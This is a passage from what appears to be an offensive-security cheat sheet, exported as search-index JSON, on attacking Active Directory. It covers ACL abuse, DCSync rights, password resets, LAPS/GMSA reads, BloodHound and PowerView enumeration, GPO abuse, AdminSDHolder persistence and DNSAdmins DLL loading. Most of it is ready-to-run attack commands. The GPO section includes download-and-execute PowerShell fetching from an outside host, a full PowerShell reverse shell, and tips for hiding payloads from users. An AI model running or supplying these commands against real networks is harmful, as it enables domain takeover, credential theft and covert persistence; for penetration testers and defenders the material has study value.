\"\\\\10.0.0.5\\totallyLegitScript.ps1\"\n</code></pre></li> </ul> </li> </ul>"},{"location":"active-directory/ad-adds-acl-ace/#group","title":"Group","text":"<ul> <li>This allows us to add ourselves to the Domain Admin group : <ul> <li>Windows/Linux:     <pre><code>bloodyAD --host 10.10.10.10 -d example.lab -u hacker -p MyPassword123 add groupMember 'Domain Admins' hacker\n</code></pre></li> <li>Windows only:     <pre><code>net group \"domain admins\" hacker /add /domain\n</code></pre></li> <li>Linux only:     <pre><code># Using the Samba software suite\nnet rpc group ADDMEM \"GROUP NAME\" UserToAdd -U 'hacker%MyPassword123' -W DOMAIN -I [DC IP]\n</code></pre></li> </ul> </li> </ul>"},{"location":"active-directory/ad-adds-acl-ace/#genericwrite-and-remote-connection-manager","title":"GenericWrite and Remote Connection Manager","text":"<p>Now let\u2019s say you are in an Active Directory environment that still actively uses a Windows Server version that has RCM enabled, or that you are able to enable RCM on a compromised RDSH, what can we actually do ? Well each user object in Active Directory has a tab called \u2018Environment\u2019.</p> <p>This tab includes settings that, among other things, can be used to change what program is started when a user connects over the Remote Desktop Protocol (RDP) to a TS/RDSH in place of the normal graphical environment. The settings in the \u2018Starting program\u2019 field basically function like a windows shortcut, allowing you to supply either a local or remote (UNC) path to an executable which is to be started upon connecting to the remote host. During the logon process these values will be queried by the RCM process and run whatever executable is defined. - https://sensepost.com/blog/2020/ace-to-rce/</p> <p> The RCM is only active on Terminal Servers/Remote Desktop Session Hosts. The RCM has also been disabled on recent version of Windows (&gt;2016), it requires a registry change to re-enable. * Windows/Linux:     <pre><code>bloodyAD --host 10.10.10.10 -d example.lab -u hacker -p MyPassword123 set object vulnerable_user msTSInitialProgram -v '\\\\1.2.3.4\\share\\file.exe'\nbloodyAD --host 10.10.10.10 -d example.lab -u hacker -p MyPassword123 set object vulnerable_user msTSWorkDirectory -v 'C:\\'\n</code></pre> * Windows only:     <pre><code>$UserObject = ([ADSI](\"LDAP://CN=User,OU=Users,DC=ad,DC=domain,DC=tld\"))\n$UserObject.TerminalServicesInitialProgram = \"\\\\1.2.3.4\\share\\file.exe\"\n$UserObject.TerminalServicesWorkDirectory = \"C:\\\"\n$UserObject.SetInfo()\n</code></pre></p> <p>NOTE: To not alert the user the payload should hide its own process window and spawn the normal graphical environment.</p>"},{"location":"active-directory/ad-adds-acl-ace/#writedacl","title":"WriteDACL","text":"<p>To abuse <code>WriteDacl</code> to a domain object, you may grant yourself the DcSync privileges. It is possible to add any given account as a replication partner of the domain by applying the following extended rights <code>Replicating Directory Changes/Replicating Directory Changes All</code>.</p> <ul> <li> <p>WriteDACL on Domain:</p> <ul> <li>Windows/Linux:     <pre><code># Give DCSync right to the principal identity\nbloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B add dcsync user2\n\n# Remove right after DCSync\nbloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B remove dcsync user2\n</code></pre></li> <li>Windows only:      <pre><code># Give DCSync right to the principal identity\nImport-Module .\\PowerView.ps1\n$SecPassword = ConvertTo-SecureString 'user1pwd' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN.LOCAL\\user1', $SecPassword)\nAdd-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=domain,DC=local' -Rights DCSync -PrincipalIdentity user2 -Verbose -Domain domain.local \n</code></pre></li> </ul> </li> <li> <p>WriteDACL on Group:</p> <ul> <li>Windows/Linux:     <pre><code>bloodyAD --host my.dc.corp -d corp -u devil_user1 -p 'P@ssword123' add genericAll devil_user1 'cn=INTERESTING_GROUP,dc=corp'\n\n# Remove right\nbloodyAD --host my.dc.corp -d corp -u devil_user1 -p 'P@ssword123' remove genericAll devil_user1 'cn=INTERESTING_GROUP,dc=corp'\n</code></pre></li> <li>Windows only:     <pre><code># Using native command\nnet group \"INTERESTING_GROUP\" User1 /add /domain\n# Or with external tool\nPowerSploit&gt; Add-DomainObjectAcl -TargetIdentity \"INTERESTING_GROUP\" -Rights WriteMembers -PrincipalIdentity User1\n</code></pre></li> </ul> </li> </ul>"},{"location":"active-directory/ad-adds-acl-ace/#writeowner","title":"WriteOwner","text":"<p>An attacker can update the owner of the target object. Once the object owner has been changed to a principal the attacker controls, the attacker may manipulate the object any way they wants.  * Windows/Linux:     <pre><code>bloodyAD --host my.dc.corp -d corp -u devil_user1 -p 'P@ssword123' set owner target_object devil_user1\n</code></pre> * Windows only:     <pre><code>Powerview&gt; Set-DomainObjectOwner -Identity 'target_object' -OwnerIdentity 'controlled_principal'\n</code></pre></p> <p>This ACE can be abused for an Immediate Scheduled Task attack, or for adding a user to the local admin group.</p>"},{"location":"active-directory/ad-adds-acl-ace/#readlapspassword","title":"ReadLAPSPassword","text":"<p>An attacker can read the LAPS password of the computer account this ACE applies to. * Windows/Linux:     <pre><code>bloodyAD -u john.doe -d bloody.lab -p Password512 --host 192.168.10.2 get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime\n</code></pre> * Windows only:     <pre><code>Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'\n</code></pre></p>"},{"location":"active-directory/ad-adds-acl-ace/#readgmsapassword","title":"ReadGMSAPassword","text":"<p>An attacker can read the GMSA password of the account this ACE applies to. * Windows/Linux:     <pre><code>bloodyAD -u john.doe -d bloody -p Password512 --host 192.168.10.2 get object 'gmsaAccount$' --attr msDS-ManagedPassword\n</code></pre> * Windows only:     <pre><code># Save the blob to a variable\n$gmsa = Get-ADServiceAccount -Identity 'SQL_HQ_Primary' -Properties 'msDS-ManagedPassword'\n$mp = $gmsa.'msDS-ManagedPassword'\n\n# Decode the data structure using the DSInternals module\nConvertFrom-ADManagedPasswordBlob $mp\n</code></pre></p>"},{"location":"active-directory/ad-adds-acl-ace/#forcechangepassword","title":"ForceChangePassword","text":"<p>An attacker can change the password of the user this ACE applies to: * Windows/Linux:     <pre><code># Using bloodyAD with pass-the-hash\nbloodyAD --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B set password target_user target_newpwd\n</code></pre> * Windows:     <pre><code>$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\nSet-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword\n</code></pre> * Linux:     <pre><code># Using rpcclient from the  Samba software suite\nrpcclient -U 'attacker_user%my_password' -W DOMAIN -c \"setuserinfo2 target_user 23 target_newpwd\" \n</code></pre></p>"},{"location":"active-directory/ad-adds-acl-ace/#references","title":"References","text":"<ul> <li>ACE to RCE - @JustinPerdok - July 24, 2020</li> <li>Access Control Entries (ACEs) - The Hacker Recipes - @_nwodtuhs</li> <li>Escalating privileges with ACLs in Active Directory - April 26, 2018 - Rindert Kramer and Dirk-jan Mollema</li> </ul>"},{"location":"active-directory/ad-adds-enumerate/","title":"Active Directory - Enumeration","text":""},{"location":"active-directory/ad-adds-enumerate/#using-bloodhound","title":"Using BloodHound","text":"<p>Use the correct collector:</p> <ul> <li>AzureHound for Azure Active Directory</li> <li>SharpHound for local Active Directory</li> <li>RustHound for local Active Directory</li> </ul> <p>Examples:</p> <ul> <li> <p>use BloodHoundAD/AzureHound (more info: Cloud - Azure Pentest)</p> </li> <li> <p>use BloodHoundAD/BloodHound <pre><code># run the collector on the machine using SharpHound.exe\n# https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe\n# /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe\n.\\SharpHound.exe -c all -d active.htb --searchforest\n.\\SharpHound.exe -c all,GPOLocalGroup # all collection doesn't include GPOLocalGroup by default\n.\\SharpHound.exe --CollectionMethod DCOnly # only collect from the DC, doesn't query the computers (more stealthy)\n\n.\\SharpHound.exe -c all --LdapUsername &lt;UserName&gt; --LdapPassword &lt;Password&gt; --JSONFolder &lt;PathToFile&gt;\n.\\SharpHound.exe -c all --LdapUsername &lt;UserName&gt; --LdapPassword &lt;Password&gt; --domaincontroller 10.10.10.100 -d active.htb\n.\\SharpHound.exe -c all,GPOLocalGroup --outputdirectory C:\\Windows\\Temp --randomizefilenames --prettyjson --nosavecache --encryptzip --collectallproperties --throttle 10000 --jitter 23\n\n# or run the collector on the machine using Powershell\n# https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1\n# /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1\nInvoke-BloodHound -SearchForest -CSVFolder C:\\Users\\Public\nInvoke-BloodHound -CollectionMethod All  -LDAPUser &lt;UserName&gt; -LDAPPass &lt;Password&gt; -OutputDirectory &lt;PathToFile&gt;\n\n# or remotely via BloodHound Python\n# https://github.com/fox-it/BloodHound.py\npip install bloodhound\nbloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local -c all\n\n# or locally/remotely from an ADExplorer snapshot from SysInternals (ADExplorer remains a legitimate binary signed by Microsoft, avoiding detection with security solutions)\n# https://github.com/c3c/ADExplorerSnapshot.py\npip3 install --user .\nADExplorerSnapshot.py &lt;snapshot path&gt; -o &lt;*.json output folder path&gt;\n</code></pre></p> </li> <li>Collect more data for certificates exploitation using Certipy   <pre><code>certipy find 'corp.local/john:Passw0rd@dc.corp.local' -bloodhound\ncertipy find 'corp.local/john:Passw0rd@dc.corp.local' -old-bloodhound\ncertipy find 'corp.local/john:Passw0rd@dc.corp.local' -vulnerable -hide-admins -username user@domain -password Password123\n</code></pre></li> <li>use OPENCYBER-FR/RustHound <pre><code># Windows with GSSAPI session\nrusthound.exe -d domain.local --ldapfqdn domain\n# Windows/Linux simple bind connection username:password\nrusthound.exe -d domain.local -u user@domain.local -p Password123 -o output -z\n# Linux with username:password and ADCS module for @ly4k BloodHound version\nrusthound -d domain.local -u 'user@domain.local' -p 'Password123' -o /tmp/adcs --adcs -z\n</code></pre></li> </ul> <p>Then import the zip/json files into the Neo4J database and query them.</p> <pre><code>root@payload$ apt install bloodhound \n\n# start BloodHound and the database\nroot@payload$ neo4j console\n# or use docker\nroot@payload$ docker run -itd -p 7687:7687 -p 7474:7474 --env NEO4J_AUTH=neo4j/bloodhound -v $(pwd)/neo4j:/data neo4j:4.4-community\n\nroot@payload$ ./bloodhound --no-sandbox\nGo to http://127.0.0.1:7474, use db:bolt://localhost:7687, user:neo4J, pass:neo4j\n</code></pre> <p>NOTE: Currently BloodHound Community Edition is still a work in progress, it is highly recommended to stay on the original BloodHoundAD/BloodHound version. </p> <pre><code>git clone https://github.com/SpecterOps/BloodHound\ncd examples/docker-compose/\ncat docker-compose.yml | docker compose -f - up\n# UI: http://localhost:8080/ui/login\n# Username: admin\n# Password: see your Docker logs\n</code></pre> <p>You can add some custom queries like :</p> <ul> <li>Bloodhound-Custom-Queries from @hausec</li> <li>BloodHoundQueries from CompassSecurity</li> <li>BloodHound Custom Queries from Exegol - @ShutdownRepo</li> <li>Certipy BloodHound Custom Queries from ly4k</li> </ul> <p>Replace the customqueries.json file located at <code>/home/username/.config/bloodhound/customqueries.json</code> or <code>C:\\Users\\USERNAME\\AppData\\Roaming\\BloodHound\\customqueries.json</code>.</p>"},{"location":"active-directory/ad-adds-enumerate/#using-powerview","title":"Using PowerView","text":"<ul> <li>Get Current Domain: <code>Get-NetDomain</code></li> <li>Enum Other Domains: <code>Get-NetDomain -Domain &lt;DomainName&gt;</code></li> <li>Get Domain SID: <code>Get-DomainSID</code></li> <li>Get Domain Policy: <pre><code>Get-DomainPolicy\n\n#Will show us the policy configurations of the Domain about system access or kerberos\n(Get-DomainPolicy).\"system access\"\n(Get-DomainPolicy).\"kerberos policy\"\n</code></pre></li> <li>Get Domain Controlers: <pre><code>Get-NetDomainController\nGet-NetDomainController -Domain &lt;DomainName&gt;\n</code></pre></li> <li>Enumerate Domain Users: <pre><code>Get-NetUser\nGet-NetUser -SamAccountName &lt;user&gt; \nGet-NetUser | select cn\nGet-UserProperty\n\n#Check last password change\nGet-UserProperty -Properties pwdlastset\n\n#Get a specific \"string\" on a user's attribute\nFind-UserField -SearchField Description -SearchTerm \"wtver\"\n\n#Enumerate user logged on a machine\nGet-NetLoggedon -ComputerName &lt;ComputerName&gt;\n\n#Enumerate Session Information for a machine\nGet-NetSession -ComputerName &lt;ComputerName&gt;\n\n#Enumerate domain machines of the current/specified domain where specific users are logged into\nFind-DomainUserLocation -Domain &lt;DomainName&gt; | Select-Object UserName, SessionFromName\n</code></pre></li> <li>Enum Domain Computers: <pre><code>Get-NetComputer -FullData\nGet-DomainGroup\n\n#Enumerate Live machines \nGet-NetComputer -Ping\n</code></pre></li> <li>Enum Groups and Group Members: <pre><code>Get-NetGroupMember -GroupName \"&lt;GroupName&gt;\" -Domain &lt;DomainName&gt;\n\n#Enumerate the members of a specified group of the domain\nGet-DomainGroup -Identity &lt;GroupName&gt; | Select-Object -ExpandProperty Member\n\n#Returns all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences\nGet-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName\n</code></pre></li> <li>Enumerate Shares <pre><code>#Enumerate Domain Shares\nFind-DomainShare\n\n#Enumerate Domain Shares the current user has access\nFind-DomainShare -CheckShareAccess\n</code></pre></li> <li>Enum Group Policies: <pre><code>Get-NetGPO\n\n# Shows active Policy on specified machine\nGet-NetGPO -ComputerName &lt;Name of the PC&gt;\nGet-NetGPOGroup\n\n#Get users that are part of a Machine's local Admin group\nFind-GPOComputerAdmin -ComputerName &lt;ComputerName&gt;\n</code></pre></li> <li>Enum OUs: <pre><code>Get-NetOU -FullData \nGet-NetGPO -GPOname &lt;The GUID of the GPO&gt;\n</code></pre></li> <li>Enum ACLs: <pre><code># Returns the ACLs associated with the specified account\nGet-ObjectAcl -SamAccountName &lt;AccountName&gt; -ResolveGUIDs\nGet-ObjectAcl -ADSprefix 'CN=Administrator, CN=Users' -Verbose\n\n#Search for interesting ACEs\nInvoke-ACLScanner -ResolveGUIDs\n\n#Check the ACLs associated with a specified path (e.g smb share)\nGet-PathAcl -Path \"\\\\Path\\Of\\A\\Share\"\n</code></pre></li> <li>Enum Domain Trust: <pre><code>Get-NetDomainTrust\nGet-NetDomainTrust -Domain &lt;DomainName&gt;\n</code></pre></li> <li>Enum Forest Trust: <pre><code>Get-NetForestDomain\nGet-NetForestDomain Forest &lt;ForestName&gt;\n\n#Domains of Forest Enumeration\nGet-NetForestDomain\nGet-NetForestDomain Forest &lt;ForestName&gt;\n\n#Map the Trust of the Forest\nGet-NetForestTrust\nGet-NetDomainTrust -Forest &lt;ForestName&gt;\n</code></pre></li> <li>User Hunting: <pre><code>#Finds all machines on the current domain where the current user has local admin access\nFind-LocalAdminAccess -Verbose\n\n#Find local admins on all machines of the domain:\nInvoke-EnumerateLocalAdmin -Verbose\n\n#Find computers were a Domain Admin OR a specified user has a session\nInvoke-UserHunter\nInvoke-UserHunter -GroupName \"RDPUsers\"\nInvoke-UserHunter -Stealth\n\n#Confirming admin access:\nInvoke-UserHunter -CheckAccess\n</code></pre></li> </ul>"},{"location":"active-directory/ad-adds-enumerate/#using-ad-module","title":"Using AD Module","text":"<ul> <li>Get Current Domain: <code>Get-ADDomain</code></li> <li>Enum Other Domains: <code>Get-ADDomain -Identity &lt;Domain&gt;</code></li> <li>Get Domain SID: <code>Get-DomainSID</code></li> <li>Get Domain Controlers: </li> </ul> <pre><code>Get-ADDomainController\nGet-ADDomainController -Identity &lt;DomainName&gt;\n</code></pre> <ul> <li>Enumerate Domain Users: <pre><code>Get-ADUser -Filter * -Identity &lt;user&gt; -Properties *\n\n#Get a specific \"string\" on a user's attribute\nGet-ADUser -Filter 'Description -like \"*wtver*\"' -Properties Description | select Name, Description\n</code></pre></li> <li>Enum Domain Computers: <pre><code>Get-ADComputer -Filter * -Properties *\nGet-ADGroup -Filter * \n</code></pre></li> <li>Enum Domain Trust: <pre><code>Get-ADTrust -Filter *\nGet-ADTrust -Identity &lt;DomainName&gt;\n</code></pre></li> <li>Enum Forest Trust: <pre><code>Get-ADForest\nGet-ADForest -Identity &lt;ForestName&gt;\n\n#Domains of Forest Enumeration\n(Get-ADForest).Domains\n</code></pre></li> <li>Enum Local AppLocker Effective Policy: <pre><code>Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections\n</code></pre></li> </ul>"},{"location":"active-directory/ad-adds-enumerate/#user-hunting","title":"User Hunting","text":"<p>Sometimes you need to find a machine where a specific user is logged in.   You can remotely query every machines on the network to get a list of the users's sessions.</p> <ul> <li>CrackMapExec   <pre><code>cme smb 10.10.10.0/24 -u Administrator -p 'P@ssw0rd' --sessions\nSMB         10.10.10.10    445    WIN-8OJFTLMU1IG  [+] Enumerated sessions\nSMB         10.10.10.10    445    WIN-8OJFTLMU1IG  \\\\10.10.10.10            User:Administrator\n</code></pre></li> <li>Impacket Smbclient   <pre><code>$ impacket-smbclient Administrator@10.10.10.10\n# who\nhost:  \\\\10.10.10.10, user: Administrator, active:     1, idle:     0\n</code></pre></li> <li>PowerView Invoke-UserHunter   <pre><code># Find computers were a Domain Admin OR a specified user has a session\nInvoke-UserHunter\nInvoke-UserHunter -GroupName \"RDPUsers\"\nInvoke-UserHunter -Stealth\n</code></pre></li> </ul>"},{"location":"active-directory/ad-adds-enumerate/#other-interesting-commands","title":"Other Interesting Commands","text":"<ul> <li>Find Domain Controllers <pre><code>nslookup domain.com\nnslookup -type=srv _ldap._tcp.dc._msdcs.&lt;domain&gt;.com\nnltest /dclist:domain.com\nGet-ADDomainController -filter * | Select-Object name\ngpresult /r\n$Env:LOGONSERVER \necho %LOGONSERVER%\n</code></pre></li> </ul>"},{"location":"active-directory/ad-adds-enumerate/#references","title":"References","text":"<ul> <li>Explain like I\u2019m 5: Kerberos - Apr 2, 2013 - @roguelynn</li> <li>Pen Testing Active Directory Environments - Part I: Introduction to crackmapexec (and PowerView)</li> <li>Pen Testing Active Directory Environments - Part II: Getting Stuff Done With PowerView</li> <li>Pen Testing Active Directory Environments - Part III:  Chasing Power Users</li> <li>Pen Testing Active Directory Environments - Part IV: Graph Fun</li> <li>Pen Testing Active Directory Environments - Part V: Admins and Graphs</li> <li>Pen Testing Active Directory Environments - Part VI: The Final Case</li> <li>Attacking Active Directory: 0 to 0.9 - Eloy P\u00e9rez Gonz\u00e1lez - 2021/05/29</li> <li>Fun with LDAP, Kerberos (and MSRPC) in AD Environments</li> <li>Penetration Testing Active Directory, Part I - March 5, 2019 - Hausec</li> <li>Penetration Testing Active Directory, Part II - March 12, 2019 - Hausec</li> <li>Using bloodhound to map the user network - Hausec</li> <li>PowerView 3.0 Tricks - HarmJ0y</li> </ul>"},{"location":"active-directory/ad-adds-group-policy-objects/","title":"Active Directory - Group Policy Objects","text":"<p>Creators of a GPO are automatically granted explicit Edit settings, delete, modify security, which manifests as CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner</p> <p> GPO Priorization : Organization Unit &gt; Domain &gt; Site &gt; Local</p> <p>GPO are stored in the DC in <code>\\\\&lt;domain.dns&gt;\\SYSVOL\\&lt;domain.dns&gt;\\Policies\\&lt;GPOName&gt;\\</code>, inside two folders User and Machine. If you have the right to edit the GPO you can connect to the DC and replace the files. Planned Tasks are located at <code>Machine\\Preferences\\ScheduledTasks</code>.</p> <p> Domain members refresh group policy settings every 90 minutes with a random offset of 0 to 30 minutes but it can locally be forced with the following command: <code>gpupdate /force</code>. </p>"},{"location":"active-directory/ad-adds-group-policy-objects/#find-vulnerable-gpo","title":"Find vulnerable GPO","text":"<p>Look a GPLink where you have the Write right.</p> <pre><code>Get-DomainObjectAcl -Identity \"SuperSecureGPO\" -ResolveGUIDs |  Where-Object {($_.ActiveDirectoryRights.ToString() -match \"GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner\")}\n</code></pre>"},{"location":"active-directory/ad-adds-group-policy-objects/#abuse-gpo-with-sharpgpoabuse","title":"Abuse GPO with SharpGPOAbuse","text":"<pre><code># Build and configure SharpGPOAbuse\n$ git clone https://github.com/FSecureLABS/SharpGPOAbuse\n$ Install-Package CommandLineParser -Version 1.9.3.15\n$ ILMerge.exe /out:C:\\SharpGPOAbuse.exe C:\\Release\\SharpGPOAbuse.exe C:\\Release\\CommandLine.dll\n\n# Adding User Rights\n.\\SharpGPOAbuse.exe --AddUserRights --UserRights \"SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight\" --UserAccount bob.smith --GPOName \"Vulnerable GPO\"\n\n# Adding a Local Admin\n.\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob.smith --GPOName \"Vulnerable GPO\"\n\n# Configuring a User or Computer Logon Script\n.\\SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContents \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\\\"\" --GPOName \"Vulnerable GPO\"\n\n# Configuring a Computer or User Immediate Task\n# /!\\ Intended to \"run once\" per GPO refresh, not run once per system\n.\\SharpGPOAbuse.exe --AddComputerTask --TaskName \"Update\" --Author DOMAIN\\Admin --Command \"cmd.exe\" --Arguments \"/c powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\\\"\" --GPOName \"Vulnerable GPO\"\n.\\SharpGPOAbuse.exe --AddComputerTask --GPOName \"VULNERABLE_GPO\" --Author 'LAB.LOCAL\\User' --TaskName \"EvilTask\" --Arguments  \"/c powershell.exe -nop -w hidden -enc BASE64_ENCODED_COMMAND \" --Command \"cmd.exe\" --Force\n</code></pre>"},{"location":"active-directory/ad-adds-group-policy-objects/#abuse-gpo-with-powergpoabuse","title":"Abuse GPO with PowerGPOAbuse","text":"<ul> <li>https://github.com/rootSySdk/PowerGPOAbuse</li> </ul> <pre><code>PS&gt; . .\\PowerGPOAbuse.ps1\n\n# Adding a localadmin \nPS&gt; Add-LocalAdmin -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'\n\n# Assign a new right \nPS&gt; Add-UserRights -Rights \"SeLoadDriverPrivilege\",\"SeDebugPrivilege\" -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'\n\n# Adding a New Computer/User script \nPS&gt; Add-ComputerScript/Add-UserScript -ScriptName 'EvilScript' -ScriptContent $(Get-Content evil.ps1) -GPOIdentity 'SuperSecureGPO'\n\n# Create an immediate task \nPS&gt; Add-GPOImmediateTask -TaskName 'eviltask' -Command 'powershell.exe /c' -CommandArguments \"'$(Get-Content evil.ps1)'\" -Author Administrator -Scope Computer/User -GPOIdentity 'SuperSecureGPO'\n</code></pre>"},{"location":"active-directory/ad-adds-group-policy-objects/#abuse-gpo-with-pygpoabuse","title":"Abuse GPO with pyGPOAbuse","text":"<pre><code>$ git clone https://github.com/Hackndo/pyGPOAbuse\n\n# Add john user to local administrators group (Password: H4x00r123..)\n./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id \"12345677-ABCD-9876-ABCD-123456789012\"\n\n# Reverse shell example\n./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id \"12345677-ABCD-9876-ABCD-123456789012\" \\ \n    -powershell \\ \n    -command \"\\$client = New-Object System.Net.Sockets.TCPClient('10.20.0.2',1234);\\$stream = \\$client.GetStream();[byte[]]\\$bytes = 0..65535|%{0};while((\\$i = \\$stream.Read(\\$bytes, 0, \\$bytes.Length)) -ne 0){;\\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\\$bytes,0, \\$i);\\$sendback = (iex \\$data 2&gt;&amp;1 | Out-String );\\$sendback2 = \\$sendback + 'PS ' + (pwd).Path + '&gt; ';\\$sendbyte = ([text.encoding]::ASCII).GetBytes(\\$sendback2);\\$stream.Write(\\$sendbyte,0,\\$sendbyte.Length);\\$stream.Flush()};\\$client.Close()\" \\ \n    -taskname \"Completely Legit Task\" \\\n    -description \"Dis is legit, pliz no delete\" \\ \n    -user\n</code></pre>"},{"location":"active-directory/ad-adds-group-policy-objects/#abuse-gpo-with-powerview","title":"Abuse GPO with PowerView","text":"<pre><code># Enumerate GPO\nGet-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}\n\n# New-GPOImmediateTask to push an Empire stager out to machines via VulnGPO\nNew-GPOImmediateTask -TaskName Debugging -GPODisplayName VulnGPO -CommandArguments '-NoP -NonI -W Hidden -Enc AAAAAAA...' -Force\n</code></pre>"},{"location":"active-directory/ad-adds-group-policy-objects/#abuse-gpo-with-standin","title":"Abuse GPO with StandIn","text":"<pre><code># Add a local administrator\nStandIn.exe --gpo --filter Shards --localadmin user002\n\n# Set custom right to a user\nStandIn.exe --gpo --filter Shards --setuserrights user002 --grant \"SeDebugPrivilege,SeLoadDriverPrivilege\"\n\n# Execute a custom command\nStandIn.exe --gpo --filter Shards --tasktype computer --taskname Liber --author \"REDHOOK\\Administrator\" --command \"C:\\I\\do\\the\\thing.exe\" --args \"with args\"\n</code></pre>"},{"location":"active-directory/ad-adds-group-policy-objects/#references","title":"References","text":"<ul> <li>GPO Abuse - Part 1 - RastaMouse - 6 January 2019</li> <li>GPO Abuse - Part 2 - RastaMouse - 13 January 2019</li> <li>Abusing GPO Permissions - harmj0y - March 17, 2016</li> <li>GPO Abuse: \"You can't see me\" - Huy Kha -  July 19, 2019</li> <li>A Red Teamer\u2019s Guide to GPOs and OUs - APRIL 2, 2018 - @_wald0</li> </ul>"},{"location":"active-directory/ad-adds-groups/","title":"Active Directory - Groups","text":""},{"location":"active-directory/ad-adds-groups/#dangerous-built-in-groups-usage","title":"Dangerous Built-in Groups Usage","text":"<p>If you do not want modified ACLs to be overwritten every hour, you should change ACL template on the object <code>CN=AdminSDHolder,CN=System</code> or set <code>\"dminCount</code> attribute to <code>0</code> for the required object.</p> <p>The AdminCount attribute is set to <code>1</code> automatically when a user is assigned to any privileged group, but it is never automatically unset when the user is removed from these group(s).</p> <p>Find users with <code>AdminCount=1</code>.</p> <pre><code>crackmapexec ldap 10.10.10.10 -u username -p password --admin-count\n# or\nbloodyAD --host 10.10.10.10 -d example.lab -u john -p pass123 get search --filter '(admincount=1)' --attr sAMAccountName\n# or\npython ldapdomaindump.py -u example.com\\john -p pass123 -d ';' 10.10.10.10\njq -r '.[].attributes | select(.adminCount == [1]) | .sAMAccountName[]' domain_users.json\n# or\nGet-ADUser -LDAPFilter \"(objectcategory=person)(samaccountname=*)(admincount=1)\"\nGet-ADGroup -LDAPFilter \"(objectcategory=group) (admincount=1)\"\n# or\n([adsisearcher]\"(AdminCount=1)\").findall()\n</code></pre>"},{"location":"active-directory/ad-adds-groups/#adminsdholder-attribute","title":"AdminSDHolder Attribute","text":"<p>The Access Control List (ACL) of the AdminSDHolder object is used as a template to copy permissions to all \"protected groups\" in Active Directory and their members. Protected groups include privileged groups such as Domain Admins, Administrators, Enterprise Admins, and Schema Admins.</p> <p>If you modify the permissions of AdminSDHolder, that permission template will be pushed out to all protected accounts automatically by <code>SDProp</code> (in an hour). E.g: if someone tries to delete this user from the Domain Admins in an hour or less, the user will be back in the group. * Windows/Linux:   <pre><code>bloodyAD --host 10.10.10.10 -d example.lab -u john -p pass123 add genericAll 'CN=AdminSDHolder,CN=System,DC=example,DC=lab' john\n\n# Clean up after\nbloodyAD --host 10.10.10.10 -d example.lab -u john -p pass123 remove genericAll 'CN=AdminSDHolder,CN=System,DC=example,DC=lab' john\n</code></pre> * Windows only:   <pre><code># Add a user to the AdminSDHolder group:\nAdd-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -PrincipalIdentity username -Rights All -Verbose\n\n# Right to reset password for toto using the account titi\nAdd-ObjectACL -TargetSamAccountName toto -PrincipalSamAccountName titi -Rights ResetPassword\n\n# Give all rights\nAdd-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName toto -Verbose -Rights All\n</code></pre></p>"},{"location":"active-directory/ad-adds-groups/#dns-admins-group","title":"DNS Admins Group","text":"<p>It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of dns.exe (SYSTEM).</p> <p> Require privileges to restart the DNS service.</p> <ul> <li>Enumerate members of DNSAdmins group</li> <li>Windows/Linux:     <pre><code>bloodyAD --host 10.10.10.10 -d example.lab -u john -p pass123 get object DNSAdmins --attr msds-memberTransitive\n</code></pre></li> <li>Windows only:     <pre><code>Get-NetGroupMember -GroupName \"DNSAdmins\"\nGet-ADGroupMember -Identity DNSAdmins\n</code></pre></li> <li>Change dll loaded by the DNS service     <pre><code># with RSAT\ndnscmd &lt;servername&gt; /config /serverlevelplugindll \\\\attacker_IP\\dll\\mimilib.dll\ndnscmd 10.10.10.11 /config /serverlevelplugindll \\\\10.10.10.10\\exploit\\privesc.dll\n\n# with DNSServer module\n$dnsettings = Get-DnsServerSetting -ComputerName &lt;servername&gt; -Verbose -All\n$dnsettings.ServerLevelPluginDll = \"\\attacker_IP\\dll\\mimilib.dll\"\nSet-DnsServerSetting -InputObject $dnsettings -ComputerName &lt;servername&gt; -Verbose\n</code></pre></li> <li>Check the previous command success     <pre><code>Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters\\ -Name ServerLevelPluginDll\n</code></pre></li> <li>Restart DNS     <pre><code>sc \\\\dc01 stop dns\nsc \\\\dc01 start dns\n</code></pre></li> </ul>"},{"location":"active-directory/ad-adds-groups/#schema-admins-group","title":"Schema Admins Group","text":"<p>The Schema Admins group is a security group in Microsoft Active Directory that provides its members with the ability to make changes to the schema of an Active Directory forest. The 